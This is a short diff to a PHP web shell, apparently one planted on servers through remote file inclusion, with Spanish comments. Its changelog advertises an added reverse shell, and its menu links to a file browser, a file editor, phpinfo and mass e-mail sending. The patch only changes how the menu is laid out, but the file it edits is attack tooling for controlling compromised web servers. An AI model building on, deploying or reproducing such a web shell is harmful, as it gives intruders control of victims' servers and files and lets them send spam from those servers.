@@ -47,6 +47,7 @@
     [+] leerarchivo() ahora llama a cat "$archivo"
     [+] Muestra un div lateral con información importante
     [+] Agregada shell de conexion inversa
+    [+] Agregados los links del menu en una linea abajo
     
    ToDo:
    [!] Eliminar los mensajes de: "No se puede leer /var/log/messages porque supera los 50000 bytes", o ponerlos como link
@@ -1272,7 +1273,9 @@ psybnc.conf
 echo'
     </div>
     </div>
-    <div class="contenedorgrande" id="contenedorabajo"  style="text-align:center;">
+    ';
+    if($_GET["w"]){
+        echo'<div class="contenedorgrande" id="contenedorabajo"  style="text-align:center;">
         <a href="'.$rfiurl.'w=directivas">Directivas</a> 
         <a href="'.$rfiurl.'w=phpinfo">PHPInfo</a> 
         <a href="'.$rfiurl.'w=info">Mas informaci&oacute;n</a> 
@@ -1282,8 +1285,9 @@ echo'
         <a href="'.$rfiurl.'w=archivos">Navegador de archivos</a> 
         <a href="'.$rfiurl.'w=editar">Editor de archivos</a> 
         <a href="'.$rfiurl.'w=mail">Enviar E-mails</a> 
-        <a href="'.$rfiurl.'w=creditos">Cr&eacute;ditos</a> 
-    </div>
+        <a href="'.$rfiurl.'w=creditos">Cr&eacute;ditos</a>'; 
+    }
+echo'    </div>
 </body>
 </html>';
 
